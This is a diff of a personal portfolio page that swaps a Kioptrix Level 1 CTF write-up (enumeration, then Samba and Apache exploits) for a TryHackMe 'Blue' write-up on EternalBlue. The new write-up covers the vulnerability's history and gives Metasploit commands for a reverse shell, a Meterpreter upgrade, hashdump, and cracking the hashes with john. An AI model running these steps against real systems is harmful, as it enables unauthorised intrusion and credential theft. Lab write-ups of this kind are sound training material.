@@ -16,7 +16,7 @@
     
     
       
-        <title>A Patch Too Late - Kyle Droulard | Portfolio</title>
+        <title>A Study In Blue - Kyle Droulard | Portfolio</title>
       
     
     
@@ -58,7 +58,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#a-patch-too-late" class="md-skip">
+        <a href="#a-study-in-blue" class="md-skip">
           Skip to content
         </a>
       
@@ -94,7 +94,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              A Patch Too Late
+              A Study In Blue
             
           </span>
         </div>
@@ -217,7 +217,7 @@
   
   
   <span class="md-ellipsis">
-    CTFs
+    Attack Analysis
     
   </span>
   
@@ -283,151 +283,62 @@
 
 
 
-<h1 id="a-patch-too-late">A Patch Too Late</h1>
-<h1 id="about">About</h1>
-<p><strong>Target</strong>: Kioptrix Level 1 (Vuln Hub download: <a href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">here</a>)</p>
+<h1 id="a-study-in-blue">A Study In Blue</h1>
 <p><strong>Author:</strong> Kyle Droulard</p>
-<h2 id="summary">Summary</h2>
-<p>In the early 2000s, services like Apache, Samba, and SSH formed the backbone of web infrastructure. But in their earlier versions, they came with significant vulnerabilities. They serve as critical teaching tools for exploit development, service enumeration, privilege escalation and ultimately the importance of good patch management. </p>
-<p><strong>Kioptrix Level 1</strong> proves to be a good study for these vulnerable services. It’s a deliberately vulnerable Linux virtual machine emulating a pre-2005 web stack. This environment provides an understanding of how legacy misconfigurations and poor patch hygiene can give attackers full root access with minimal resistance.</p>
-<p>In this write-up, I explore the box from enumeration to exploitation, while reflecting on the legacy of the vulnerabilities that made it possible.</p>
-<h2 id="tools-used">Tools Used</h2>
-<table>
-<thead>
-<tr>
-<th>Tool</th>
-<th>Purpose</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Nmap</td>
-<td>Port &amp; service discovery</td>
-</tr>
-<tr>
-<td>Netdiscover</td>
-<td>Host discovery</td>
-</tr>
-<tr>
-<td>smbclient</td>
-<td>SMB enumeration</td>
-</tr>
-<tr>
-<td>Burp Suite</td>
-<td>Manual web testing</td>
-</tr>
-<tr>
-<td>Metasploit</td>
-<td>Exploitation</td>
-</tr>
-<tr>
-<td>GCC</td>
-<td>Compiling custom exploit</td>
-</tr>
-</tbody>
-</table>
-<h2 id="initial-discovery">Initial Discovery</h2>
-<p>To locate the Kioptrix vm, I used an ARP-based discovery method by sending ARP requests across a CIDR block and identifying devices across the network.</p>
-<p><strong>Tool:</strong> <a href="https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=&amp;cad=rja&amp;uact=8&amp;ved=2ahUKEwim45KTutCOAxUJlGoFHfRdEawQFnoECBkQAQ&amp;url=https%3A%2F%2Fwww.stationx.net%2Fnmap-ping-sweep%2F&amp;usg=AOvVaw3FEqmn2J1D_yUNe-PKZxuW&amp;opi=89978449">nmap ping sweep</a>, or <a href="https://www.hackercoolmagazine.com/beginners-guide-to-netdiscover/?srsltid=AfmBOopGG8It26r71ZGPr0JTNuINpMuvOY0IsTazMXT1PhVmY7qXeMu7">netdiscover</a></p>
-<p>Once the IP address is identified we can proceed with the assessment by identifying vulnerable services running on the server with a port scan.</p>
-<p><img alt="image.png" src="../../../images/APatchTooLate/image.png" /></p>
-<h2 id="port-enumeration">Port Enumeration</h2>
-<p>To identify vulnerable services running on the target we can run a Nmap scan. As Anti Virus is not something that we are worried about here we can run a quick scan.</p>
-<p><strong>Command:</strong> <code>nmap -T5 -A &lt;host_ip&gt;</code></p>
-<p><strong>Additional Resources:</strong>  <a href="https://www.stationx.net/nmap-cheat-sheet/">Nmap Cheat Sheet</a></p>
-<p><img alt="image.png" src="../../../images/APatchTooLate/image1.png" /></p>
-<p>From our scans we can observe that the server is running vulnerable versions of SSH, HTTP and SMB. We can proceed investigating by performing Web Enumeration, SMB Enumeration and possible SSH exploits. </p>
-<h2 id="web-enumeration">Web Enumeration</h2>
-<p>Through web enumeration we will try to discover possible vulnerable endpoints that can provide us attack surfaces. </p>
-<p><strong>Tools:</strong> Burp Suite, dirbuster or nikto.</p>
-<p><strong>Additional Resources:</strong> </p>
+<p>This is a study of the vulnerability <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0144">CVE-2017-0144</a>, publicly known as EternalBlue. This vulnerability came to light in April 2017, when a group called <strong>The Shadow Brokers</strong> leaked a toolset belonging to the <strong>NSA-linked</strong> group <strong>Equation Group</strong>. While the leak unveiled a stock pile of zero-day exploits, it was EternalBlue that truly became infamous. </p>
+<p>Attacks like <strong>WannaCry</strong> (May 2017) and <strong>NotPetya</strong> (June 2017) were direct fallout from this leak. Millions of businesses, hospitals, and governments were affected. The aftermath sparked global concern about the risks of stockpiling zero day vulnerabilities.</p>
+<p>If your curious about the bigger picture behind zero-day exploits and cyber arms dealing, check out <strong><em>This Is How They Tell Me the World Ends</em></strong> by Nicole Perlroth<strong>.</strong>  Her writing reads like a Bond novel, weaving real-world cyber espionage into a gripping, global narrative.</p>
+<p>In the remainder of this write-up, we’ll examine the EternalBlue exploit from an attacker’s perspective by completing the ‘<a href="https://tryhackme.com/r/room/blue">Blue</a>’ room on TryHackMe.</p>
+<h1 id="initial-discovery">Initial Discovery:</h1>
+<p>After booting up the Blue machine, the first step is to perform a port scan to identify potential vulnerabilities. This is done by using nmap, which reveals that the host is a Microsoft Windows 2008 Server running SMB. As this appears to be SMBv1, it leads us to suspect that it might be vulnerable to MS17-010 (Eternal Blue). We can confirm this with an Nmap scan.  </p>
+<p>Command <code>nmap -A &lt;target-ip&gt;</code> </p>
+<p><img alt="image.png" src="../../../images/AStudyInBlue/image.png" /></p>
+<p>Command:<code>nmap -p445 --script smb-vuln-ms17-010 &lt;target-ip&gt;</code></p>
+<p><img alt="image.png" src="../../../images/AStudyInBlue/image1.png" /></p>
+<h1 id="understanding-eternalblue">Understanding EternalBlue</h1>
+<p>EternalBlue (CVE-2017-0144) is a critical vulnerability in the MS SMBv1 protocol that allows for unauthenticated remote code execution on unpatched systems.</p>
+<p>The flaw exists because SMBv1 did not properly validate specially crafted network packets. By sending malicious SMB packets an attacker could trigger a buffer overflow in the Windows kernel. This overflow enabled execution of arbitrary code - without needing valid credentials or user interaction.</p>
+<p>EternalBlue was particularly dangerous because: </p>
 <ul>
-<li><a href="https://www.freecodecamp.org/news/an-introduction-to-web-server-scanning-with-nikto/">Nikto</a></li>
-<li><a href="https://www.kali.org/tools/dirbuster/">dirbuster | Kali Linux Tools</a></li>
+<li>Wormability: It could spread automatically between vulnerable machines without user interaction.</li>
+<li>Stealth: It was a low-level system flaw making it difficult to detect or prevent.</li>
+<li>Widespread Impact: It was used in global ransomware attacks like <a href="https://www.akamai.com/glossary/what-is-wannacry-ransomware">WannaCry</a> (May 2017) and <a href="https://www.cloudflare.com/learning/security/ransomware/petya-notpetya-ransomware/">NotPetya</a> (June 2017), which caused widespread havoc and billions of dollars in damages.</li>
 </ul>
-<h3 id="findings"><strong>Findings</strong></h3>
-<p><strong>Finding:</strong> http[://]192[.]168[.]1[.]107/manual/mod </p>
-<p>Our first discovery is a web page that provides Apache modules documentation. Though as no sensitive content is exposed there is no immediate value here so we will take note of it for further inspection, though it appears to be a dead end.</p>
-<p><img alt="image.png" src="../../../images/APatchTooLate/image2.png" /></p>
-<p><strong>Finding:</strong> http[://]192[.]168[.]1[.]107/test.php</p>
-<p>Our second discovery is a web page that executes PHP on the server. Though as there is no visible injection point this doesn't provide immediate value. So we will take note of this as well, though it also appears to be a dead end.</p>
-<p><img alt="image.png" src="../../../images/APatchTooLate/image3.png" /></p>
-<p><strong>Finding:</strong> Information Disclosure vulnerability. </p>
-<p>Our third web enumeration finding is an Information Disclosure vulnerability, which provides us that the web application is running Apache 1.3.20. However, we previously discovered that via Nmap so this doesn't provide us immediate value.</p>
-<p><img alt="image.png" src="../../../images/APatchTooLate/image4.png" /></p>
-<h2 id="smb-enumeration">SMB Enumeration</h2>
-<p>Through performing SMB enumeration we can try to discover unauthenticated access accessible file shares.</p>
-<p><strong>Tool:</strong>  <code>smbclient</code> </p>
-<p><strong>Findings:</strong> </p>
+<p>The devices impacted were:</p>
 <ul>
-<li><strong>Shares:</strong> IPC$, ADMIN$</li>
-<li><strong>Server:</strong> KIOPTRIX</li>
-<li><strong>Workgroup:</strong> MYGROUP</li>
+<li>Windows XP</li>
+<li>Windows 7</li>
+<li>Windows Server 2003/2008</li>
 </ul>
-<p><strong>Outcome:</strong> No exploit path via SMB shares, but version information confirmed possible exploit targets.</p>
-<p><img alt="image.png" src="../../../images/APatchTooLate/image5.png" /></p>
-<h2 id="ssh-observations">SSH Observations</h2>
-<p>The target runs SSH version 1, which is obsolete and vulnerable to key reuse, replay and downgrade attacks. However in this context brute-force and MiTM attacks are outside of the scope for this study, so we won’t be pursuing this further.</p>
-<p><img alt="image.png" src="../../../images/APatchTooLate/image6.png" /></p>
-<h1 id="research-exploits">Research Exploits</h1>
-<p>After conducting some research we can see that these exposed services are notoriously vulnerable and we can even find some known exploits within GitHub and Metasploit. </p>
-<p><strong>Reference:</strong> <a href="http://exploit-db.comhttps://www.exploit-db.com/">exploit-db.com</a></p>
-<table>
-<thead>
-<tr>
-<th>Service</th>
-<th>Version</th>
-<th>CVE</th>
-<th>Exploits</th>
-<th>Notes</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Apache</td>
-<td>1.3.20</td>
-<td><a href="https://nvd.nist.gov/vuln/detail/CVE-2002-0082">CVE-2002-0082</a></td>
-<td>• <a href="https://www.exploit-db.com/exploits/764">ExploitDB Finding</a></td>
-<td></td>
-</tr>
-<tr>
-<td>• <a href="https://github.com/heltonWernik/OpenLuck?tab=readme-ov-file">Possible Exploit in GitHub</a></td>
-<td>Source code for exploit found here.</td>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td>Samba</td>
-<td>2.2.1a</td>
-<td><a href="https://nvd.nist.gov/vuln/detail/CVE-2003-0201">CVE-2003-0201</a></td>
-<td><a href="https://www.exploit-db.com/exploits/10">ExploitDB Finding</a></td>
-<td>An exploit could utilize Metasploit</td>
-</tr>
-<tr>
-<td>OpenSSH</td>
-<td>2.9p2 (v1)</td>
-<td>N/A</td>
-<td>N/A</td>
-<td>Possible MiTM and Replay Attacks via Key Pair Collision in SSH V1. (More <a href="https://www.cvedetails.com/cve/CVE-2001-1473/">here</a>.)</td>
-</tr>
-</tbody>
-</table>
-<h1 id="exploitation">Exploitation</h1>
-<p>Samba 2.2.1a has a vulnerability due to a buffer overflow in trans2open (CVE-2003-0201) we can exploit this by using Metasploit to create a reverse shell. If successfully exploited we will be able to obtain root access.</p>
-<p><strong>Tool:</strong> Metasploit</p>
-<p><strong>Reference:</strong> <a href="https://github.com/security-cheatsheet/metasploit-cheat-sheet">Metasploit Cheat</a></p>
-<p><img alt="image.png" src="../../../images/APatchTooLate/image7.png" /></p>
-<p><img alt="image.png" src="../../../images/APatchTooLate/image8.png" /></p>
-<p><img alt="image.png" src="../../../images/APatchTooLate/image9.png" /></p>
-<h2 id="apache-exploit">Apache Exploit</h2>
-<p>Apache 1.3.20 suffers from a buffer overflow vulnerability due to Apache-SSL improperly handling memory during the <code>i2d_SSL_SESSION</code> function call. This allows for remote code execution if the attacker utilizes a very large client certificate if it is signed by a trusted Certificate Authority. We can find C source code on GitHub which we can then clone, compile it and run against our target machine to obtain a root shell.</p>
-<p><strong>Resource:</strong> <a href="https://github.com/heltonWernik/OpenLuck?tab=readme-ov-file">GitHub Exploit - OpenLuck</a></p>
-<p><img alt="image.png" src="../../../images/APatchTooLate/image10.png" /></p>
-<h1 id="conclusion">Conclusion</h1>
-<p><strong>Root Cause:</strong> Outdated Samba and Apache Services</p>
-<p><strong>Result:</strong> Successful root shell via Metasploit and compiled C program</p>
-<p><strong>Lessons Learned:</strong> Importance of patching legacy services and securing default shares.</p>
+<p>Microsoft released a patch for the vulnerability in March 2017 under identifier MS17-010, but many machines remained unpatched when the NSA’s exploit was leaked by the Shadow brokers in April 2017. </p>
+<p><strong><em>A Side Note:</em></strong> WannaCry had an unusual mitigation - a researcher accidentally discovered a “kill switch” that helped stop its spread. For more on it see this article by <a href="https://techcrunch.com/2019/07/08/the-wannacry-sinkhole/">TechCrunch</a>. </p>
+<h2 id="gaining-access">Gaining Access</h2>
+<p>Now that we have confirmed the target is likely vulnerable to MS17-010, we can begin exploitation. While tools like SearchSploit reveal a variety of PoC exploits, we’ll use Metasploit for ease of use and reliability.</p>
+<p>First, launch Metasploit with <code>msfconsole</code>, then search for <code>eternalblue</code> or <code>ms17_010</code>. </p>
+<p><img alt="image.png" src="../../../images/AStudyInBlue/image2.png" /></p>
+<p><img alt="image.png" src="../../../images/AStudyInBlue/image3.png" /></p>
+<p>Configure the exploit options and run it to create a reverse shell on the target. </p>
+<pre><code class="language-bash">set payload payload/windows/x64/shell/reverse_tcp
+set RHOSTS &lt;target-ip&gt;
+run
+</code></pre>
+<p><img alt="image.png" src="../../../images/AStudyInBlue/image4.png" /></p>
+<p><img alt="image.png" src="../../../images/AStudyInBlue/image5.png" /></p>
+<h2 id="maintaining-access">Maintaining Access</h2>
+<p>To maintain access and perform further post-exploitation tasks, we can escalate the shell session to a Meterpreter session. <em>(Note: You’ll need to background your current session with ctrl+z).</em></p>
+<pre><code class="language-bash">use post/multi/manage/shell_to_meterpreter
+set SESSION &lt;session-id&gt;
+run
+</code></pre>
+<p>Once upgraded, we can extract password hashes from the machine using the Meterpreter built-in <code>hashdump</code> utility. (Note: Requires SYSTEM privileges)</p>
+<p><img alt="image.png" src="../../../images/AStudyInBlue/image6.png" /></p>
+<p><img alt="image.png" src="../../../images/AStudyInBlue/image7.png" /></p>
+<p><img alt="image.png" src="../../../images/AStudyInBlue/image8.png" /></p>
+<p>With the extracted hashes we can then obtain the password via john:</p>
+<p><code>john --format=NT --rules --w=/usr/share/wordlists/rockyou.txt &lt;password-file&gt;</code></p>
+<p><img alt="image.png" src="../../../images/AStudyInBlue/image9.png" /></p>
+<h2 id="success">Success!</h2>
+<p><img alt="image.png" src="../../../images/AStudyInBlue/image10.png" /></p>
 
 
 
